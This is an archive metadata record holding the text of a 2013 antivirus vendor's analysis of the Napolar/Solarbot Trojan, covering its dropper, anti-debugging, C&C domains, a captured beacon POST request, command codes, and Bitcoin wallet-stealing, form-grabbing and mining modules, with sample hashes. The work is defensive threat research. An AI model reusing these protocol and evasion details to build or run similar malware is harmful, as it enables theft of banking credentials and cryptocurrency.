{
    "id": "a8b6ddef-aff0-4e09-bc96-6a3565925d5b",
    "created_at": "2023-01-12T15:09:13.528536Z",
    "updated_at": "2025-03-27T02:05:42.109695Z",
    "deleted_at": null,
    "sha1_hash": "3d43e60567d12cc46b6ad50ea64b72252d3b763c",
    "title": "2013-09-25 - Win32-64-Napolar- New Trojan shines on the cyber crime-scene",
    "authors": "",
    "file_creation_date": "2022-05-28T04:00:04Z",
    "file_modification_date": "2022-05-28T04:00:04Z",
    "file_size": 1030382,
    "plain_text": "# Win32/64:Napolar: New Trojan shines on the cyber crime- scene\n\n**[blog.avast.com/2013/09/25/win3264napolar-new-trojan-shines-on-the-cyber-crime-scene/](https://blog.avast.com/2013/09/25/win3264napolar-new-trojan-shines-on-the-cyber-crime-scene/)**\n\n[Threat Intelligence Team 25 Sep 2013](https://blog.avast.com/author/threat-intelligence-team)\n\nWin32/64:Napolar: New Trojan shines on the cyber crime-scene\n\nIn recent weeks, malware samples resolved as Win32/64:Napolar from AVAST's name pools\ngenerated a lot of hits within our file and network shields. Independently, we observed an\nadvertising campaign of a new Trojan dubbed Solarbot that started around May 2013. This\ncampaign did not run through shady hacking forums as we are used to, but instead it ran\nthrough a website indexed in the main search engines. The website is called\nhttp://solarbot.net and presents its offer with a professional looking design:\n\nFor the Win32/64:Napolar Trojan, the pipe used to inter-process communication is named\n_\\\\.\\pipe\\napSolar. Together with the presence of character strings like \"CHROME.DLL,\"_\n\"OPERA.DLL,\" \"trusteer,\" \"data_inject,\" and features we'll mention later, we have almost no\ndoubts that the Trojan and Solarbot coincide. Let us look at some analysis.\n\n**Dropper**\n\n\n-----\n\nAn initial binary comes in the form of an SFX archive named in a similar fashion as\n_Photo_021-WWW.FACEBOOK.COM.exe that handles two events: A silent execution of the_\nTrojan's dropper and the display of a distracting image of girls:\n\nInformation from the author's statement, says that Solarbot was written in Lazarus IDE for\nFree Pascal. We cannot recollect any professional or commercial Trojan that shares this\nproperty. On the other hand, we can not confirm that the analyzed binary is written in Free\nPascal, because a lot of information in the PE header differs from the usual binaries\ncompiled by Free Pascal.\n\nThe structure of the core executable is as follows:\n\n\n-----\n\nThe initial x86 part also serves for a recognition of the system's architecture. In the case of a\n64bit system, a correspondent module is extracted and loaded. The LDE64 (Length\nDisassembler Engine) is a 32 bit official tool based on BeaEngine able to decode instruction\nin 32 bits and 64 bits architectures. Disassembling could be needed for a fine modification of\nsystem functions (correct hooking with a custom one or emulating a chunk of original code).\n\nAs described on the advertising page, all important WINAPI functions from KERNEL32.DLL,\nNTDLL.DLL, WININET.DLL, WS2_32.DLL, SHLWAPI.DLL, PSAPI.DLL are resolved by\nCRC32 hash (the constant table of CRC32 hash algorithm is found at the address\n0xFF395A) and stored in a virtual table. Also a few anti-debugging tricks related with\nIsDebuggerPresent and OutputDebugString functions have been observed. The bot after\ninstallation into %AppData\\lsass.exe starts its instance at newly allocated memory at the\nvirtual address 0xFE0000 and terminates itself. That means that it cannot be identified in the\nlist of running processes.\n\nTo find the distribution of this infection we analyzed manifestations of part of related\ndetections. The incidence reaches at least several hundred unique computers a day and it\ncould be a little more for all Solarbot samples. Places most affected with the infection are the\nSouth and Central American countries of Colombia, Venezuela, Peru, Mexico, and\nArgentina; the Asian countries of the Philippines and Vietnam, and Poland in Europe:\n\n\n-----\n\n**Communication protocol**\n\nA few gate URLs (C&C servers) have been identified so far: xyz25.com, cmeef.info,\n_paloshke.org. The latter is registered by the infamous Bizcn.com, Inc. We have_ [blogged](https://blog.avast.com/2012/05/09/%E2%80%9Cfix-your-hard-disk%E2%80%9D-with-fake-s-m-a-r-t-repair-tool/)\nabout fake repair tools with domains registered with this fraudulent Chinese registrar in the\npast. The advertising site solarbot.net is registered with the following info:\n\nDomain Name: SOLARBOT.NET\nRegistrar: NETEARTH ONE INC. D/B/A NETEARTH\nWhois Server: whois.advancedregistrar.com\nReferral URL: http://www.advancedregistrar.com\nName Server: NS1.BITCOIN-DNS.COM\nName Server: NS2.BITCOIN-DNS.COM\nStatus: clientTransferProhibited\nUpdated Date: 01-aug-2013\nCreation Date: 01-aug-2013\nExpiration Date: 01-aug-2014\n\nand the registrant's contact data are hidden behind PRIVACYPROTECT.ORG which is a\nservice attracted by various groups involved in malicious activities.\n\n\n-----\n\nAn initial HTTP POST request for getting a command to be executed looks like this:\n\nPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR\n1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\nHost: www.paloshke.org\nContent-Length: 81\nPragma: no-cache\nv=1.0&u=USER_NAME&c=COMP_NAME&s={7C79CE12-E753-D05E-0DE6DFBF7B79CE12}&w=2.5.1&b=32\n\nwhere s string denotes a key for a consequent RC4 decryption generated from a victim's\nenvironment and v stands for the bot's version. Number 1.0 suggests that we are facing the\ninitial development stage of this bot.\n\nAfter a successful request, a response follows. As we mentioned, it is encrypted with RC4\nand the right key is sent unencrypted in the POST query. The plain response structure takes\nthe form of an array of strings separated with zero byte. Every string starts with a byte\nidentifying a command number (a total of 15 various switch cases were observed) appended\nwith a corresponding plain string. For a connection delay (command 0xC), it is the count of\nseconds (we have seen 3600 usually); for a command related to a download, it is a URL to a\nfile followed by a control hash and a decryption key (command 0x12); for an installation of\nadditional binaries serves command 0x2, e.g. a download of the Bitcoin wallet stealing plugin\ncalled WalletSteal.bin. By definition from bitcoin.org, a Bitcoin wallet is the equivalent of a\nphysical wallet on the Bitcoin network which contains private keys that allows a user to\nspend the Bitcoins allocated to it in a public record of Bitcoin transactions. Actually, this is an\nexample of the promised plugin support. The plugin is placed encrypted in the temporary\ndirectory SlrPlugin in %AppData.\n\n**Features**\n\nThe following list of features is presented officially on the website:\n\n\n-----\n\nWe have seen implemented functionalities like FTP and POP3 Grabber, Reverse Socks 5 or\nbasis of functional modularity. There were relevant strings (\"SSL\", \"http://\", \"http://\", names of\nweb browser libraries, \"NSS layer\", \"data_start\", \"data_inject\", \"data_end\" ) indicating the\npossibility of man-in-the-browser attacks. Indeed, we observed that the content of forms of\ninternet banking sites were sent to C&C in an unencrypted form, but only in the case when\nthe site requested a reputation or certificate verification. This could have connection with\ninternal list of URLs (http://urs.microsoft.com/urs.asmx; http://ocsp.verisign.com;\nhttp://ocsp.comodoca.com; http://safebrowsing.clients.google.com;\nhttp://dirpop.naver.com:8088/search.naver), updated remotely with the internal command\n0xF.\n\nNext, dynamically we have seen a download of a Bitcoin miner that was afterwards injected\nin a classic Windows notepad binary in the system's %Temp directory and executed\n(corresponds to the point \"MD5 Verified Update and Download System\" in the list).\n\nIn the end, we have to say that this bot displays solid malicious performance. Together with\nthe reasonable price of $200, it could be on the rise in the near future. Fortunately, the\nantivirus industry will react to make the life of these cyber-criminals harder.\n\n**Sources**\n\nSHA256 hashes of some selected samples and how they are covered within the AVAST\nengine:\n\n\n-----\n\nDropper 1 1f11b896cc641db605d70186be468a148a\n\n64ea233a21d353e7483239e71e1516\n\nDropper 2 f1a5707963a7e33a925111f09209a92b037\n\n32fa9292697b37e528ad941076a8d\n\nNapolar Core Binary 463d39dcbf19b5c4c9e314e5ce77bf8a51\n\n848b8c7d64e4f0a6656b9d28941e2e\n\n\nWalletSteal Plugin\nDownload\n\nWalletSteal Plugin\nx86\n\nWalletSteal Plugin\nx64\n\n\n12ca161cd72873477906100f083e43dca9\n\n36312ba44b691f5046f53b09e3b4f7\n\nbb49fa791915bf49ceb2a0563c91d2acaed\n\n6249438f349c6e75094f3924de64d\n\nff92206215115c867789dbd5a95132a2bd1\n\n53bb1e5a1ef66e539f382f2ce30dc\n\n\nWin32:Napolar-E\n\n[Cryp]\n\nWin32:Napolar-E\n\n[Cryp]\n\nWin32:Napolar-D [Trj]\n\nJS:NapolarPlugin-A\n\n[Trj]\n\nWin32:NapolarPluginB [Trj]\n\nWin32:NapolarPluginB [Trj]\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2013/2013-09-25 - Win32-64-Napolar- New Trojan shines on the cyber crime-scene.pdf"
    ],
    "report_names": [
        "2013-09-25 - Win32-64-Napolar- New Trojan shines on the cyber crime-scene.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536153,
    "ts_updated_at": 1743041142,
    "ts_creation_date": 1653710404,
    "ts_modification_date": 1653710404,
    "files": {
        "pdf": "https://archive.orkl.eu/3d43e60567d12cc46b6ad50ea64b72252d3b763c.pdf",
        "text": "https://archive.orkl.eu/3d43e60567d12cc46b6ad50ea64b72252d3b763c.txt",
        "img": "https://archive.orkl.eu/3d43e60567d12cc46b6ad50ea64b72252d3b763c.jpg"
    }
}